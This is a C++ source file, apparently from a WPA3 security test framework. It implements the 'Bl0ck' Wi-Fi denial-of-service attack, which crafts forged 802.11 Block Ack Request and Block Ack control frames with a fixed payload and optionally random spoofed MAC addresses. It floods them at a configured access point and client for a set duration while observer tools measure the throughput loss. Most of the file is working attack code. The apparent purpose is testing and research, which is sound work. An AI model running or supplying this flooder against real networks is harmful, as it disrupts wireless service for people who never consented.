#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "system/iface.h"
#include <random>
#include <chrono>
#include <thread>

#include "logger/error_log.h"
#include "observer/mausezahn_wrapper.h"
#include "observer/tshark_wrapper.h"

namespace wpa3_tester::bl0ck_attack{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    RadioTap get_bl0ck_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const int subtype) {
        Dot11 frame;
        frame.type(Dot11::CONTROL);
        frame.subtype(subtype);
        frame.addr1(ap_hw); // Receiver Address (RA)

        vector addr2_bytes(sta_hw.begin(), sta_hw.end());

        const vector<uint8_t> payload_data = {
            0x04, 0x00, 0x74, 0x49, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
        };
        // TODO v python script je prázdná hlavička, je nutné ji mít prázdnou
        // RadioTap() <- dá tam něco defaultně
        const RadioTap rt{};
        return  rt / frame / RawPDU(addr2_bytes) / RawPDU(payload_data);
    }


    void block(const string& STA_mac,
               const string& AP_mac,
               const string& iface,
               const int frame_num,
               const string& attack_type,
               const int duration_sec,
               const bool is_random) {

        // Determine subtype: BAR=8, BA=9
        int subtype;
        if (attack_type == "BAR") {
            subtype = 8;
        } else if (attack_type == "BA") {
            subtype = 9;
        } else {
            log(LogLevel::ERROR, "Invalid attack type: %s (expected BAR or BA)", attack_type.c_str());
            throw runtime_error("Invalid attack type");
        }

        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s, Subtype: %d", attack_type.c_str(), subtype);

        const NetworkInterface iface_obj(iface);
        const HWAddress<6> ap_hw(AP_mac);
        PacketSender sender;

        log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_num);

        const auto start_time = steady_clock::now();
        const auto end_time = start_time + seconds(duration_sec);

        int iteration = 0;
        while (steady_clock::now() < end_time) {
            try {
                const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);

                RadioTap block_frame = get_bl0ck_frame(ap_hw, sta_hw, subtype);
                log(LogLevel::DEBUG, "Sending batch %d", iteration);
                for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
                this_thread::sleep_for(100ms);
                iteration++;

            } catch (const exception& e) {
                log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
                throw;
            }
        }
        log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
    }

    void speed_observation_start(RunStatus &rs){
        observer::start_musezahn(rs, "mz_gen", "client", "access_point");
        observer::start_thark(rs, "client", "udp port 5201");
    }

    void run_bl0ck_attack(RunStatus& rs){
        const auto& att_cfg = rs.config.at("attack_config");
        const auto& attacker = rs.get_actor("attacker");

        const string iface   = attacker["iface"];

        const string STA_mac = rs.get_actor("client")["mac"];
        const string AP_mac = rs.get_actor("access_point")["mac"];

        const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
        const int duration = att_cfg.at("attack_time_sec").get<int>();
        const int frame_num = att_cfg.at("frame_number").get<int>();
        const bool is_random = att_cfg.at("random").get<bool>();

        speed_observation_start(rs); // TODO separate from channel switch attack

        log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
        this_thread::sleep_for(seconds(10));
        if(bl0ck_att_type == "BAR" || bl0ck_att_type == "BA"){
            block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
        } else {
            log(LogLevel::ERROR, "Unsupported attack type: %s", bl0ck_att_type.c_str());
            /*if (bl0ck_att_type == "BARS":
            BAR_SC_exploit(targeted_AP, targeted_STA, WNIC, int(numOfConcurrentFrames), int(stopAfter), int(randomMAC), int(verboseMessages))
            }*/
            throw not_implemented_error("Unsupported attack type");
        }
        this_thread::sleep_for(seconds(5));
        log(LogLevel::INFO, "Block Attack END");
    }

    void stats_bl0ck_attack(const RunStatus& rs){
        log(LogLevel::INFO , "Bl0ck attack stats");
        //const vector<LogTimePoint> disconn_events = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED");

        vector<observer::graph_lines> events;
        //events.push_back({disconn_events,"DISCONN", "red"});

        const string STA_graph_path = observer::tshark_graph(rs, "client", events);
        log(LogLevel::INFO, "Bl0ck attack stop");
    }
}
